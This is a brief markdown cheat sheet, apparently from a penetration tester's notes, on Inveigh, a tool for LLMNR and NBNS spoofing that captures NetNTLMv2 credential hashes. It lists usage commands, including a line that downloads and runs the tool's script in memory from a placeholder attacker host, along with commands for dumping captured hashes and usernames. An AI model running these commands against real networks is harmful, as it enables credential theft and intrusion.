---
tags:
  - tool
---
# Inveigh

A tool written in PowerShell and C# for performing various network spoofing and poisoning attacks.

## Capabilities

### Executable

**Note:** Press `esc` for interactive console.

```powershell
# Execute
.\Inveigh.exe

# Check options
.\Inveigh.exe -?

# Only run for 3 minutes (helpful inside psexec)
.\Inveigh.exe -RunTime 3

# View unique NetNTLMv2 hashes captured
GET NTLMV2UNIQUE

# View usernames collected from NetNTLMv2 hashes
GET NTLMV2USERNAMES
```

### Powershell

```powershell
# Import module
Import-Module .\Inveigh.ps1
iex(new-object net.webclient).downloadstring('http://$OUR_IP:$PORT/Inveigh.ps1')

# Check commands
(Get-Command Invoke-Inveigh).Parameters

# Go-to
Invoke-Inveigh -FileOutput Y -RunTime 5

# LLMNR & NBNS spoofing
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
